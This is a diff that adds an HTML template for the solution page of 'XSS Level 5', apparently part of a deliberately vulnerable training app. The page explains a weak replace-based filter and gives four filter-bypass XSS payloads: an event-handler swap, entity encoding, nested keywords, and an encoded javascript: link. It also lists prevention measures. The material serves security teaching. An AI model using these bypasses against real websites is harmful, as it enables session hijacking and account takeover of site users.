@@ -1,0 +1,91 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: XSS Level 5{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 5 - XSS with Advanced Filters</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This page implements more advanced filtering by removing multiple dangerous patterns:
+                </p>
+                <pre><code>filtered_input = filtered_input.replace('javascript:', '')
+filtered_input = filtered_input.replace('onerror', '')
+filtered_input = filtered_input.replace('onload', '')
+filtered_input = filtered_input.replace('&lt;script', '')
+filtered_input = filtered_input.replace('&lt;/script', '')</code></pre>
+                <p>
+                    However, this approach still has several weaknesses:
+                </p>
+                <ul>
+                    <li>It only removes the first occurrence of each pattern</li>
+                    <li>It doesn't account for encoding or obfuscation</li>
+                    <li>It doesn't handle all possible event handlers</li>
+                    <li>It performs case-insensitive matching but doesn't handle mixed case</li>
+                </ul>
+                
+                <h3>Solution</h3>
+                <p>There are multiple ways to bypass these filters:</p>
+                
+                <h4>1. Using less common event handlers:</h4>
+                <div class="alert alert-secondary">
+                    <code>&lt;img src="x" onmouseover="alert('XSS Level 5 Completed!')"&gt;</code>
+                </div>
+                
+                <h4>2. Using HTML encoding:</h4>
+                <div class="alert alert-secondary">
+                    <code>&lt;img src="x" on&#101;rror="alert('XSS Level 5 Completed!')"&gt;</code>
+                </div>
+                
+                <h4>3. Using nested replacements:</h4>
+                <div class="alert alert-secondary">
+                    <code>&lt;img src="x" ononerrorload="alert('XSS Level 5 Completed!')"&gt;</code>
+                </div>
+                
+                <h4>4. Using Unicode escape sequences:</h4>
+                <div class="alert alert-secondary">
+                    <code>&lt;a href="&#106;avascript:alert('XSS Level 5 Completed!')"&gt;Click me&lt;/a&gt;</code>
+                </div>
+                
+                <h3>Real-world Impact</h3>
+                <p>
+                    This challenge simulates real-world scenarios where developers implement multiple layers of filtering
+                    but still leave vulnerabilities. Many production applications have been compromised through similar
+                    filter bypass techniques.
+                </p>
+                <p>
+                    Advanced XSS attacks can lead to:
+                </p>
+                <ul>
+                    <li>Account takeover</li>
+                    <li>Data theft</li>
+                    <li>Session hijacking</li>
+                    <li>Malware distribution</li>
+                </ul>
+                
+                <h3>Prevention</h3>
+                <p>To properly prevent advanced XSS attacks, developers should:</p>
+                <ul>
+                    <li>Use context-aware output encoding</li>
+                    <li>Implement a strict Content Security Policy (CSP)</li>
+                    <li>Use HTML sanitization libraries like DOMPurify</li>
+                    <li>Adopt a whitelist approach for allowed HTML tags and attributes</li>
+                    <li>Use modern web frameworks with built-in XSS protections</li>
+                    <li>Implement input validation on both client and server sides</li>
+                    <li>Use HTTP-only cookies to protect session information</li>
+                </ul>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level5') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
